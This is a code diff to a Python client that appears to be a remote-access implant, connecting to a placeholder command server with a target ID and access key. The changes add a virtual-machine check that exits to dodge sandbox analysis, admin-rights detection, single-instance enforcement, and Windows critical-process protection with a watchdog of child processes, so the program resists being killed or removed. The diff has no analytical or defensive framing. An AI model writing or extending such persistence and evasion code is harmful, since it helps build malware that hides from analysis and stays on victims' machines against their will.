@@ -1,7 +1,9 @@
 import asyncio
+import ctypes
 import multiprocessing
 import os
-import time
+import platform
+import sys
 import httpx
 import websockets
 import uuid
@@ -15,6 +17,10 @@ from enum import Enum
 from dependencies.modules.commands import Command as CommandEnum, CommandResult
 from dependencies.modules.commands import CommandArgs
 from dependencies.modules.persistence.prevent_death import ProcessManager
+from dependencies.modules.persistence.critical_process import CriticalProcess
+from dependencies.modules.persistence.vm import VM
+
+from dependencies.modules.utils import RunSingle
 from dependencies.globals import command_executor, command_executor_ws
 
 class ResponseType(Enum):
@@ -170,13 +176,36 @@ class WebSocketClient:
         finally:
             print("Stream response handler completed.")
             
+def is_elevated():
+    if platform.system() == "Windows":
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    else:
+        return os.geteuid() == 0
+    
 async def main():
     target_id = "TARGETID_TO_REPLACE"
     access_key = "ACCESS_KEY_TO_REPLACE"
     base_url = "BASE_URL_TO_REPLACE"
+
     multiprocessing.freeze_support()  # Important for PyInstaller on Windows
-    pm = ProcessManager(number_of_children=4)
-    pm.run()
+    var = RunSingle()
+    
+    if VM().is_vm() and platform.system() == "Windows":
+        sys.exit(1)
+
+    if platform.system() == "Windows" and is_elevated():
+        critical_process = CriticalProcess()
+        if not critical_process.protect_process():
+            print("Couldn't protect despite elevation")
+            process_manager = ProcessManager(number_of_children=4)
+            process_manager.run()
+    else:
+        process_manager = ProcessManager(number_of_children=4)
+        process_manager.run()
+
     client = WebSocketClient(base_url, target_id, access_key)
     await client.connect_websocket()
 
